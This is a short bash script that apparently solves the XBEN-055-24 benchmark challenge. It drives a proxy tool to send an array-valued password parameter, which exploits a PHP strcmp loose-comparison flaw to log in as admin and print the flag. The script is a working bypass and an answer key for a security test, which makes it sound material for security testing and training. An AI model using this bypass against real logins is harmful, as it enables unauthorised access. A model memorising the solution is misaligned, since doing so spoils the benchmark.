#!/usr/bin/env bash
# XBEN-055-24 — PHP strcmp array bypass. Proxy-mode twin. Passing the password
# as an array makes strcmp() return NULL, which `== 0` treats as a match, so the
# login succeeds as admin.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben055p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'path=/' --set 'query.username=admin' --set 'query.password[]=x' >/dev/null
print_flag
